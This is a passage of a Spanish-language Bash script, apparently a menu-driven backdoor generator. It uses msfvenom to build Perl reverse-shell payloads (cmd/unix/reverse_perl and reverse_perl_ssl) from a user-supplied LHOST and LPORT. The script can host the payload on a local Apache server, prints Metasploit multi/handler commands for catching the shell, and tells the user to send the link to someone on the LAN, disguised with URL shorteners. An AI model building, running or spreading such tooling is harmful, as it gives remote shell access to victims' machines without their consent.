banner10 
echo -e                  "\e[0;36m[\e[0;34m01\e[0;36m] \e[1;36mcmd/unix/reverse_perl "
echo -e                  "\e[0;36m[\e[0;34m02\e[0;36m] \e[1;36mcmd/unix/reverse_perl_ssl"
echo ""
read -p $"Payload > " optiondos
	if [[ $optiondos == 1 || $optiondos == 01 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mcmd/unix/reverse_perl"
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .pl > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .pl al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .pl. Tambien si quieres que el .pl se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .pl al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p cmd/unix/reverse_perl LHOST=$lhost LPORT=$lport -f raw > /var/www/html/$nombre.pl
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload cmd/unix/reverse_perl"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.pl \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .pl del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.pl
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p cmd/unix/reverse_perl LHOST=$lhost LPORT=$lport -f raw > $nombre.pl
			mv $nombre.pl Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload cmd/unix/reverse_perl"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p cmd/unix/reverse_perl LHOST=$lhost LPORT=$lport -f raw > $ruta/$nombre.pl
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload cmd/unix/reverse_perl"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	elif [[ $optiondos == 2 || $optiondos == 02 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mcmd/unix/reverse_perl_ssl"
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .pl > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .pl al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .pl. Tambien si quieres que el .pl se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .pl al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p cmd/unix/reverse_perl_ssl LHOST=$lhost LPORT=$lport -f raw > /var/www/html/$nombre.pl
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload cmd/unix/reverse_perl_ssl"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.pl \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .pl del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.pl
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p cmd/unix/reverse_perl_ssl LHOST=$lhost LPORT=$lport -f raw > $nombre.pl
			mv $nombre.pl Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload cmd/unix/reverse_perl_ssl"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p cmd/unix/reverse_perl_ssl LHOST=$lhost LPORT=$lport -f raw > $ruta/$nombre.pl
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload cmd/unix/reverse_perl_ssl"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi

	fi

fi

if [[ $option == 99 || $option == 099 ]]; then
	echo -e "\e[1;33mEsta opcion esta esta en mantenimiento"
	sleep 2
	clear
	banner
	banner2
else 
	echo -e "\e[1;31mPara seguir debes elegir una opcion valida"
	sleep 2
	clear
	banner
	banner2
fi
}		
banner2





